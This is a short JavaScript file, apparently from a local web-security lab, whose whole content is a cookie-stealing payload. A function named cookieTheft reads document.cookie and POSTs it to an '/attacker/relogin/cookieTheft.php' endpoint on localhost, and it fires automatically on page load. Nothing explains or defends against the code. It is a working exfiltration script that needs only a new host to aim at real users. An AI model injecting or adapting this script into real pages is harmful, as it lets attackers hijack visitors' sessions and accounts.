function cookieTheft() {
	let at_http = new XMLHttpRequest();
	let at_url = "http://localhost:8089/attacker/relogin/cookieTheft.php";
	let c_value = encodeURIComponent(document.cookie);
	let at_params = `sendcookie=&c=${c_value}`;

	at_http.open("POST", at_url, true);
	at_http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	at_http.onreadystatechange = function() {
	    if(at_http.readyState == 4 && at_http.status == 200) {

	    }
	}
	at_http.send(at_params);
}
window.onload = function() {
	cookieTheft();
}
